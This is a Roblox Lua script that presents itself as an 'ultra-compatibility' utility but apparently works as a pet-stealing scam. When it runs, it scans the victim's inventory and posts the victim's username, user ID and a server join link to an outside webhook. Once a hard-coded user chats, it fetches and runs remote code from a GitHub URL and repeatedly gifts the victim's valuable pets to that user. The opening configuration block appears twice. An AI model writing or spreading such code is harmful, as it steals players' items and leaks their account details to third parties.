--[[
    ULTRA-COMPATIBILITY VERSION
    This script has been completely re-engineered for executors with faulty or non-standard Lua parsers.
    All logic has been made as explicit and simple as possible to prevent parsing errors.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

--[[ CONFIGURATION - PET LISTS ]]--
local MasterPetList = {
    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
}

local TrashPetList = {
    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
    "Pig", "Crab", "Starfish", "Seagull"
}
--[[ END CONFIGURATION ]]--

--[[
    ULTRA-COMPATIBILITY & DEBUG-ENHANCED VERSION V2
    This script has been re-engineered with verbose diagnostics to trace the trigger logic
    and a fix for a potential race condition.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

--[[ CONFIGURATION - PET LISTS ]]--
local MasterPetList = {
    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
}

local TrashPetList = {
    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
    "Pig", "Crab", "Starfish", "Seagull"
}
--[[ END CONFIGURATION ]]--

local TargetUsername = "Proplong3"
local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"

local petEmojis = {
    ["Butterfly"] = "🦋", ["Raccoon"] = "🦝", ["Dragonfly"] = "🐲", ["Queen Bee"] = "👑", ["Disco Bee"] = "🕺",
    ["Mimic Octopus"] = "🐙", ["Pack Bee"] = "📦"
}

local giftingWeightThreshold = 11
local webhookWeightThreshold = 12
local hugePetWeightThreshold = 111

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService")

local loadstringExecuted = false
local giftingActive = false

-- (Other functions remain the same as they are correct)
local function getExecutorName() if getexecutorname then local n=getexecutorname() return n:sub(1,1):upper()..n:sub(2) elseif syn and syn.protect_gui then return"Synapse X"elseif is_sirhurt_closure then return"SirHurt"elseif Krnl or krnl_LOADED then return"Krnl"elseif SW_VERSION or getscriptwareversion then return"Script-Ware"else return"Unknown"end end
local function isPetInList(p,l) for _,n in ipairs(l)do if string.sub(p,1,#n)==n then return true,n end end return false,nil end
local function checkInventoryForValuables() local d,n={},{} for _,i in ipairs(backpack:GetChildren())do if i:IsA("Tool")then local m,b=isPetInList(i.Name,MasterPetList) local t,_=isPetInList(i.Name,TrashPetList) local r,s,w=false,false,0 local wS=string.match(i.Name,"%[(%d+%.?%d*) KG%]") if wS then local eW=tonumber(wS) if eW then w=eW if w>=webhookWeightThreshold then r=true end if w>=hugePetWeightThreshold then s=true end end end if(r or(m and not t))and not table.find(n,i.Name)then table.insert(n,i.Name) table.insert(d,{name=i.Name,isHuge=s,baseName=b,weight=w})end end end return #d>0,d end
local function sortPets(a,b) if a.isHuge and not b.isHuge then return true elseif not a.isHuge and b.isHuge then return false elseif a.isHuge and b.isHuge then return a.weight>b.weight else return a.name<b.name end end
local function sendWebhookNotification(d) table.sort(d,sortPets) local pV=string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",LocalPlayer.Name,LocalPlayer.DisplayName,LocalPlayer.UserId,getExecutorName()) local fL={} for _,pD in ipairs(d)do local e if pD.isHuge then e="💪"elseif pD.baseName and petEmojis[pD.baseName]then e=petEmojis[pD.baseName]else e="⭐"end table.insert(fL,e .." - "..pD.name)end local v="```\n"..table.concat(fL,"\n").."\n```" local jL=string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId) local s,pId=pcall(function()return game.PrivateServerId end) local sT if s and pId~=""then sT="🔒 Private"else sT="🌍 Public"end local y={content="@everyone",embeds={{title="PALDOOOO WHOO🤑🤑🤑🤑",color=65280,fields={{name="👤 Player Information",value=pV,inline=false},{name="🌐 Server Type",value="```\n"..sT.."\n```",inline=false},{name="🌴 Found Pets (Sorted)",value=v,inline=false},{name="🔗 Server Link",value=jL,inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}} local function sR()request({Url=webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(y)})end pcall(sR)end

-- FUNCTION: giftPetsLoop
-- The main loop for gifting pets. Now only contains the loop logic.
local function giftPetsLoop(targetPlayer)
    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
        print("[Gifter Error] Loop cannot start, a critical component is missing.")
        giftingActive = false -- Reset the flag if the loop fails to start.
        return 
    end
    
    local args = {"GivePet", targetPlayer}
    while giftingActive and targetPlayer.Parent ~= nil do
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isMaster, _ = isPetInList(item.Name, MasterPetList)
                local isTrash, _ = isPetInList(item.Name, TrashPetList)
                local isHuge = false
                
                local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
                if weightString then
                    local weight = tonumber(weightString)
                    if weight and weight >= giftingWeightThreshold then isHuge = true end
                end

                if isHuge or (isMaster and not isTrash) then
                    humanoid:EquipTool(item)
                    GiftingEvent:FireServer(unpack(args))
                    task.wait(0)
                end
            end
        end
        task.wait(0)
    end
    
    giftingActive = false -- Set to false only when the loop naturally finishes.
    print("[Gifter Info] Gifting loop has stopped.")
end

-- FUNCTION: executeLoadedScript
local function executeLoadedScript()
    local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
    if success and scriptContent then
        local scriptFunction, compileError = loadstring(scriptContent)
        if scriptFunction then
            pcall(scriptFunction)
        end
    end
end

-- FUNCTION: onPlayerChatted (RE-ENGINEERED WITH DIAGNOSTICS)
-- The main trigger when a player chats.
local function onPlayerChatted(player, message)
    -- DIAGNOSTIC PRINT 1: Acknowledge that any chat was detected
    print("[Chat Trigger] Detected chat from player: " .. player.Name)

    if player.Name == TargetUsername then
        -- DIAGNOSTIC PRINT 2: Confirm the target player was the one who chatted
        print("[Chat Trigger] Chat is from the correct target: " .. TargetUsername)

        if not loadstringExecuted then
            loadstringExecuted = true
            executeLoadedScript()
        end
        
        -- The critical check for the gifting trigger
        if not giftingActive then
            -- DIAGNOSTIC PRINT 3: Confirming the gifting loop is being activated
            print("[Chat Trigger] Gifting is not active. Activating now and spawning loop...")
            
            -- FIX: Set the flag to TRUE IMMEDIATELY to prevent race conditions.
            giftingActive = true 
            task.spawn(giftPetsLoop, player)
        else
            -- DIAGNOSTIC PRINT 4: This will tell us if the trigger is being ignored on purpose
            print("[Chat Trigger] Gifting is already active, not starting another loop.")
        end
    end
end

-- === SCRIPT EXECUTION STARTS HERE ===

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

task.wait(0)
local hasPets, foundPetsData = checkInventoryForValuables()
if hasPets then
    sendWebhookNotification(foundPetsData)
end

print("Debug-Enhanced Script loaded. Awaiting chat from '" .. TargetUsername .. "'.")
